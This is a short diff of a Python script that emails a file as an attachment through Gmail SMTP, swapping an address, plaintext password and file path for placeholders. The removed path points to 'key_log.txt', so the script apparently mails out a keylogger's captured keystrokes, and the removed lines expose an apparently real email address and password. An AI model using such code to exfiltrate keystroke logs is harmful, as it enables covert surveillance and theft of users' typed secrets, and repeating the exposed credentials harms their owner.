@@ -4,9 +4,9 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-from_user = "nick.noswear@gmail.com"
-to_user = "nick.noswear@gmail.com"
-password = "Nick@123"
+from_user = "examplefrom@gmail.com"
+to_user = "exampleto@gmail.com"
+password = "********"
 
 server = smtplib.SMTP('smtp.gmail.com',587)
 server.starttls()
@@ -23,7 +23,7 @@ body = "This is a random msg"
 msg.attach(MIMEText(body,'plain'))
 
 filename = "new.txt"
-attachment = open("C:/Users/noswear/Desktop/Mail/key_log.txt")
+attachment = open(<Path for the file>)
 
 p = MIMEBase('application', 'octet-stream')
 p.set_payload((attachment).read())
